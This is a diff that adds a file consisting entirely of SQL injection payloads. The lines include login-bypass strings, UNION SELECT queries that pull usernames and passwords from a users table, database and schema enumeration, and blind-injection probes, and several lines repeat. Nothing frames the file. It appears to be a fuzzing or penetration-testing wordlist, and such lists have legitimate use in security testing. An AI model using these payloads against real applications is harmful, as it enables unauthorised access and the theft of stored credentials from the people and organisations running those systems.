@@ -1,0 +1,109 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+admin' OR '1'='1
+admin' OR '1'='1' --
+admin' OR '1'='1' #
+admin' OR '1'='1' /*
+admin' OR 1=1 --
+admin' OR 1=1 #
+admin' OR 1=1 /*
+admin'--
+admin' #
+admin' /*
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT username, password FROM users --
+' UNION SELECT 1, 2, 3, 4 --
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT username, password, NULL FROM users --
+' UNION SELECT 1, database(), user() --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns --
+' UNION SELECT @@version, user(), database() --
+' OR EXISTS(SELECT NULL FROM users) --
+' OR EXISTS(SELECT username FROM users) --
+' OR EXISTS(SELECT password FROM users) --
+' OR EXISTS(SELECT * FROM information_schema.tables) --
+' OR EXISTS(SELECT * FROM mysql.user) --
+' OR EXISTS(SELECT * FROM pg_user) --
+' OR EXISTS(SELECT * FROM sqlite_master) --
+' OR LENGTH(database())>0 --
+' OR LENGTH(user())>0 --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' OR ASCII(SUBSTRING((SELECT database()), 1, 1)) > 64 --
+' OR ASCII(SUBSTRING((SELECT user()), 1, 1)) > 64 --
+' OR 1=1 UNION SELECT NULL, NULL, NULL --
+' OR 1=1 UNION SELECT username, password FROM users --
+' OR 1=1 UNION SELECT 1, 2, 3, 4 --
+' OR 1=1 UNION SELECT NULL, username, password FROM users --
+' OR 1=1 UNION SELECT username, password, NULL FROM users --
+' OR 1=1 UNION SELECT 1, database(), user() --
+' OR 1=1 UNION SELECT table_name FROM information_schema.tables --
+' OR 1=1 UNION SELECT column_name FROM information_schema.columns --
+' OR 1=1 UNION SELECT @@version, user(), database() --
+' OR EXISTS(SELECT NULL FROM users) --
+' OR EXISTS(SELECT username FROM users) --
+' OR EXISTS(SELECT password FROM users) --
+' OR EXISTS(SELECT * FROM information_schema.tables) --
+' OR EXISTS(SELECT * FROM mysql.user) --
+' OR EXISTS(SELECT * FROM pg_user) --
+' OR EXISTS(SELECT * FROM sqlite_master) --
+' OR LENGTH(database())>0 --
+' OR LENGTH(user())>0 --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' OR ASCII(SUBSTRING((SELECT database()), 1, 1)) > 64 --
+' OR ASCII(SUBSTRING((SELECT user()), 1, 1)) > 64 --
+admin' --
+admin' #
+admin' /*
+' OR 'admin'='admin'
+' OR 'user'='user'
+' OR 'pass'='pass'
+' OR 1=1
+' OR 1=2
+' OR 1=3
+' OR 1=4
+' OR 1=5
+' OR 'x'='x'
+' OR 'text'='text'
+' OR 'password'='password'
+' OR 'admin'='admin'
+' OR 'guest'='guest'
+' OR 'root'='root'
+' OR 'sysadmin'='sysadmin'
+' OR 'sa'='sa'
+' OR 'user'='user'
+' OR 'login'='login'
+' OR 'user1'='user1'
+' OR 'test'='test'
+' OR 'guest'='guest'
+' OR 'admin1'='admin1'
+' OR 'administrator'='administrator'
+' OR 'moderator'='moderator'
+' OR 'superuser'='superuser'
+' OR 'manager'='manager'
+' OR 'support'='support'
+' OR 'client'='client'
+' OR 'customer'='customer'
+' OR 'database'='database'
+' OR 'oracle'='oracle'
+' OR 'mysql'='mysql'
+' OR 'mssql'='mssql'
+' OR 'postgres'='postgres'
+' OR 'sql'='sql'
+' OR 'query'='query'
+' OR 'data'='data'
+' OR 'backup'='backup'
+' OR 'restore'='restore'
+' OR 'dump'='dump'
+' OR 'select'='select'
+' OR 'union'='union'
+' OR 'version'='version'
+' OR 'schema'='schema'
+' OR 'info'='info'
